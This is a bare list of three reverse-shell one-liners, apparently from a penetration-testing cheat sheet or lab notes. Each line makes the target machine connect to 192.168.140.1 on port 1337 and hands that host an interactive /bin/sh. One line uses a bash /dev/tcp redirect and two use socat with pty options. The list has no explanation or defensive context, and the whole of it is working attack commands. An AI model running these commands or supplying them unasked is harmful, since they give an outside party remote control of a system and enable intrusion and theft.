bash -i >& /dev/tcp/192.168.140.1/1337 0>&1

socat tcp-connect:192.168.140.1:1337 exec:/bin/sh,stderr,pty
socat tcp-connect:192.168.140.1:1337 exec:/bin/sh,stderr,pty,setsid,sigint,sane